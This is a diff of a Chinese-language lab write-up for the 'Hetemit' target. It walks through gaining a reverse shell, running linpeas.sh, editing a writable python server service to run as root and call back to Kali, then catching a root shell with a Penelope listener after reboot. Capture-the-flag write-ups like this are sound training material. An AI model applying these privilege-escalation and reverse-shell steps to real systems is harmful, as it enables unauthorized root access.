@@ -87,9 +87,11 @@ PORT      STATE SERVICE     VERSION
 ### Access port 5000
 
 連線至 port 5000 可以看到有兩個連結
+
 ![](img/Hetemit/1.png)
 
 第二個 verify 是POST的方式，data 為 `code`
+
 ![](img/Hetemit/2.png)
 
 ### Reverse to Kali and get flag 1
@@ -121,7 +123,7 @@ share
 cat local.txt
 ```
 
-### Privilege escalation
+### Try to Privilege escalation
 
 現在要嘗試提權，我改用一個介面比較好用的 reverse shell 監聽器，叫做 [Penelope](https://github.com/brightio/penelope)，重新接上靶機
 ```shell
@@ -144,7 +146,33 @@ cat local.txt
 ```
 
 將 linpeas.sh 傳上去並執行，尋找報告中相關的漏洞，可以看到有一個跟 python server 有關的漏洞，我們可以以系統管理員的權限去修改它。
+
 ![](img/Hetemit/3.png)
-使用 Nano 編輯，並將 User 改為 root
+
+使用 Nano 編輯，將 User 改為 root，並設定 python server 的啟動指令是連線至 Kali
+
 ![](img/Hetemit/4.png)
 
+### Reboot the target and wait nc from root
+
+接著將靶機重新啟動，Kali 監聽 port 80，等待靶機開機後就會自己連上來，而且是 root 身份。順利拿到第二組 flag
+
+```shell
+┌──(kali㉿kali)-[~/Desktop/tools/penelope]
+└─$ python penelope.py 80             
+[+] Listening for reverse shells on 0.0.0.0:80 →  127.0.0.1 • 192.168.64.10 • 172.17.0.1 • 192.168.45.230                                                 
+➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from 🐧 192.168.189.117 😍 - Assigned SessionID <1>
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/192.168.189.117/192.168.189.117.log 📜
+[root@hetemit restjson_hetemit]# whoami
+root
+[root@hetemit restjson_hetemit]# pwd
+/home/cmeeks/restjson_hetemit
+[root@hetemit restjson_hetemit]# cd /root
+[root@hetemit ~]# ls
+anaconda-ks.cfg  proof.txt
+[root@hetemit ~]# cat proof.txt 
+```
